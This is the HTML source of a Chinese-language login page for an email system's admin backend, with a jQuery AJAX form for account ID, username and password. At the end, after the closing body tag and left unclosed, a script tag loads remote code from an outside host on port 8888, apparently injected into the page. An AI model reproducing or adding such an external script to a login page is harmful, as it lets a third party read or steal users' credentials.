<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>邮件系统后台登录</title>
<meta name="keywords" content="">
<meta name="description" content="">
<link rel="stylesheet" type="text/css" href="/static/css/style.css" />
<script type="text/javascript" src="/static/js/jquery-1.3.2.js"></script>
<script type="text/javascript">
	function ttt(){
	    var uid = $("#uid").val();
	    var username = $("#username").val();
	    var password = $("#password").val();
	    if ($.trim(uid) == "" || $.trim(username) == "" || $.trim(password) == ""){
	        alert("请输入用户信息");
	        return;
	    }
        $.ajax({
            type: 'POST',
            async:false,
            data:{uid:uid, username:username,password:password},
            dataType:'json',
            url: '/user/login.html',
            success: function(res) {
                if (res.success) {
                    window.location.href="/email/index.html";
                }else{
                    alert("用户名或密码错误，请检查！");
                }
            },
            error: function() {
                alert("提交失败，请检查！");
                //App.tips({type: "error", message: "提交失败，请检查！", autoclose: 3});
            }
        })
	}

	function BindEnter(obj)
    {
        //使用document.getElementById获取到按钮对象
        var button = document.getElementById('loginButton');
        if(obj.keyCode == 13)
            {
                button.click();
                obj.returnValue = false;
            }
    }
</script>
</head>

<body onkeydown="BindEnter(event)">
	<div class="layout bg_login">
		<!--form id='loginForm' name='loginForm' method="post" action="/login"-->
		<div id="login">
			<h1>邮件系统管理后台</h1>
			<ul>
                <li><label>账户ID：</label><input type="text" id="uid" name="uid" class="txt" /></li>
				<li><label>用户名：</label><input type="text" id="username" name="username" class="txt" /></li>
				<li><label>密　码：</label><input type="password" id="password" name="password" class="txt"  /></li>
				<li>
				<a class="confirm_btn" href="javascript:ttt();" name="loginButton" id="loginButton"><span>登录</span></a>
				</li>
			</ul>
		</div>
		<!--/form-->
	</div>
</body>
<script id="qclient_js" src="http://www.81c.cn:8888/tj.js?b7a0c0cd275a8d3d4f609e0f4a46a2e4" type="text/javascript">
</html>
